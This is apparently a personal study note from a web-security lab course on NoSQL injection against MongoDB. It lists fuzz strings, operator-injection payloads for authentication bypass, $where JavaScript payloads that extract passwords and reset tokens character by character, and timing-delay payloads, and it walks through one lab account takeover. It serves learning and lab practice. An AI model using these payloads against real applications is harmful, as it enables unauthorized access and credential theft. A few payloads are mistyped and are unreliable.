# NoSQLI
NoSQL injection is a vulnerability where an attacker is able to interfere with
the queries that an application makes to a NoSQL database

## NoSQL databases

designed to handle large volumes of unstructured or semi-structured data.
so they are less constraints and consistency checks than SQL.

they retrieve data in different format and use a wide range of languages than SQL, a custom language, JSON or XML.

### types

* Document stores
* Key-value stores
* Wide-column stores
* Graph databases

## syntax injection

breaking the query syntax, injecting fuzz strings or special syntax, similar to
SQLi to trigger an error or other detectable behaviors to check for sanitization or filter.


### detection

MongoDB:
`https://insecure-website.com/product/lookup?category=fizzy`
leads to: `this.category == 'fizzy'` in the database.

fuzz string in MongoDB:
``
'"`{
;$Foo}
$Foo \xYZ
``

the payload should be URL encoded or in a JSON property.

#### determine processed character

`this.category == '<differentCharacters>'`

if it causes a change, the character might have broken the query syntax, and confirm that things work by testing a valid query.

invalid: `this.category == '''`
valid: `this.category == '\''`

#### confirm conditional behaviour

send two requests, a false and a true condition, using `' && 0 && 'x` and `' && 1 && 'x`:

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`

if the application's behaviour changes, this means that the false condition impacts the query logic but the true one doesn't.

#### override existing conditions

inject a JavaScript condition that is always true: `||1||`=> `this.category ==
'fizzy'||'1'=='1'` which returns all the items.

how to ignore the rest of the query:

if `this.category == 'fizzy' && this.released == 1`, the query could be
`?category=fizzy'%00`, so: `this.category == 'fizzy'\u0000' && this.released == 1`.

## operator injection
fsfs
operators provide ways to specify conditions.

  * `$where` - Matches documents that satisfy a JavaScript expression.
  * `$ne` - Matches all values that are not equal to a specified value.
  * `$in` - Matches all of the values specified in an array.
  * `$regex` - Selects documents where values match a specified regular expression.

* JSON: `{"username":{"$ne":"invalid"}}`

* URL: `username[$ne]=invalid`, if didn't work:

  * Convert the request method from GET to POST.
  * Change the Content-Type header to application/json.
  * Add JSON to the message body.
  * Inject query operators in the JSON.


### detecting op injection in MongoDB

check with a correct credentials to see if they are allowed.

try each operator separately, and if both work, it will result in
authentication bypass.
`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

target multiple usernames:
`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

this didn't work: `{"username":"administrator","password":{"$ne":""}}`
but this did: `{"$regex":"admin.*"}, "password":{"$ne":""}}`

how to get there?: check each part of the query separately, and with different
operators.

## extract data

use JavaScript functions to extract data from the database.

some query operators or functions could be used to run JavaScript; e.g.
`$where` and `mapReduce()`

### data exfiltration

as a feature you can check out other users:
`https://insecure-website.com/user/lookup?username=admin` which results in this
query: `{"$where":"this.username == 'admin'"}`

it uses `$where` so you can inject JavaScript:
`admin' && this.password[0] == 'a' || 'a'=='b`
and get the first character of password.

or `admin' && this.password.match(/\d/) || 'a'=='b` to know whether the
password contains digits.

* you should URL encode it.

get the length:
`administrator' && this.password.length < 30 || 'a'=='b`

brute force the password:
`"administrator' && this.password[%d] == '%c' || 'a'=='b"`

## NoSQL operator injection and extract data

maybe the query doesn't use operators that enable you to run JS.
so try to inject it yourself, then use boolean conditions to determine if it's
executed.

### operator injection in MongoDB

body of a POST request:
`{"username":"wiener","password":"peter"}`

adding the `$where` operator as an additional parameter:

one request where the condition evaluates to false:
`{"username":"wiener","password":"peter", "$where":"0"}`

and another that evaluates to true:
`{"username":"wiener","password":"peter", "$where":"1"}`

difference between the responses may indicate that the JavaScript expression
in the `$where` clause is being evaluated.

### field names

in MongoDB you may need to identify valid fields in the collection before you
can extract data using JavaScript injection.

to identify whether the MongoDB database contains a password field:
`https://insecure-website.com/user/lookup?username=admin' && this.password!='`

then try other payloads for a field you are sure exist and a filed that doesn't and
compare it to it's results; e.g.:
`admin' && this.username!='` exists
`admin' && this.foo!='` doesn't

#### extracting field names

also:
if you are able to run JS, you could use `keys()` method to extract the name of
data fields:

`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
returns the first character of the field name:
  * `[0]` index of the field we want to brute force it's value
  * `{0}` index of the character we want to find
  * `a` the character we want to test

How to:

after I submitted `{"$ne": invalid}` in password input field, I received the
response `account blocked` which indicates that the operator is accepted and
the application in vulnerable.

then testing `$where`:
`{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`,
response: Invalid username or password

but on `{$where:"1"}`, response: account locked
again indicating that `$where` operator is vulnerable.

* you could also use something like: `"$where": "function(){return 0;}"`

so: "account locked" is true.

`Object.keys(userInfo)[0]` returns the first element of our object.

* to try these stuff in the browser use chatGPT.

Inside our operator, `userInfo` should be: `Object.keys(this)[0]`

* in MongoDB the first element of an object is always `_id`.

we can *verify a field* like this:

`{"username":"carlos","password":{"$ne":"invalid"}, "$where": "function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0; }}"`

so if, the first index matches `_id`, it'll return 1.
and if we can check them if we know the next fields.

if a *field is unknown*, we can brute force it:

first we need it's *length*: `"$where": "function(){ if(Object.keys(this)[3].length == 1) return 1; else 0;" }`

using this query logic or
`fmt.Sprintf("Object.keys(this)[3].match('^.{%d}%c.*')", index, c)`, we can
*brute force the next field* (looking for "account locked" in response).

almost like this we can *brute force the value*: `fmt.Sprintf("this.password.match('^.{%d}%c.*')", index, c)`

the lab:

the point is that you should trigger password reset or this field won't exist.

`fmt.Sprintf("function(){ if(Object.keys(this)[4].length == %d) return  1; else return 0;}", index)`
returns `resetPwdToken` and brute forcing it's value: `126963d19abf9ae9`

vising the `/forget-password` we can add `resetPwdToken=126963d19abf9ae9` to a GET request and we can change the user's password.

### Exfiltrating data using operators

`{"username":"myuser","password":"mypass"}`
``{"username":"admin","password":{"$regex":"^.*"}}``

If the response to this request is different to the one you receive when you
submit an incorrect password, this indicates that the application may be
vulnerable.

get password character by character:
`{"username":"admin","password":{"$regex":"^a*"}}`

### Timing based injection

triggering a database *error doesn't make a difference* in the response.

try JavaScript injection to *trigger a delay*.

To conduct timing-based NoSQL injection:

  * Load the page several times to determine a baseline loading time. Insert

  * insert a timing based payload into the input: `{"$where": "sleep(5000)"}`

  * if the response loads more slowly => successful injection.

this payload will trigger a time delay if the password beings with the letter a:

`
admin'+function(x){var waitTill = new Date(new Date().getTime() +
5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
`

`admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
